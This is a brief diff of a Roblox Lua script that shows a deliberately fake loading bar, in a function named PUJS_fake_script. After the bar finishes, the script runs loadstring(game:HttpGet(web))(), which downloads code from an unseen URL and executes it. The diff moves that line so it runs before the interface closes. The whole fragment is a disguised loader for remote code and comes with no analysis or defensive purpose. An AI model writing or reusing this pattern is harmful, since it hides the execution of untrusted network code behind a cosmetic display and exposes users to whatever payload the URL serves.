@@ -72,8 +72,8 @@ local function PUJS_fake_script()
 	local bar = script.Parent.Loader.Percentage
 	bar:TweenSize(UDim2.new(1,0,1,0), "In", "Linear", 20, true)
 	wait(20)
+	loadstring(game:HttpGet(web))()
 	wait(3)
 	script.Parent.Parent:Destroy()
-  loadstring(game:HttpGet(web))()
 end
 coroutine.wrap(PUJS_fake_script)() 
